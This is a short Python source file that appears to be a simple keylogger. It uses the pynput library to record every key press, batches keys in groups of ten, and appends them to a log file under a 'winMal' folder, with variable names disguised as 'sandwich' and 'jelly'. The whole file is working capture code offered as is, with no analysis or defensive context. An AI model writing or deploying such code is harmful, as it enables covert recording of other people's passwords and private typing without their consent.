from pynput.keyboard import Key, Listener

#sandwich = sandwich
#jelly = jelly

count = 0
jelly = []

def pr(sandwich):
    global jelly, count
    jelly.append(sandwich)
    count += 1
    print("{0} pressed".format(sandwich))
    if count >= 10:
        count = 0
        write_file(jelly)
        jelly = []

def write_file(jelly):
    with open("C:\winMal\Log\log.txt","a") as f:
        for sandwich in jelly:
            k = str(sandwich).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            
def re(sandwich):
    if sandwich == Key.esc:
        return False

with Listener(on_press=pr, on_release=re) as listener:
    listener.join()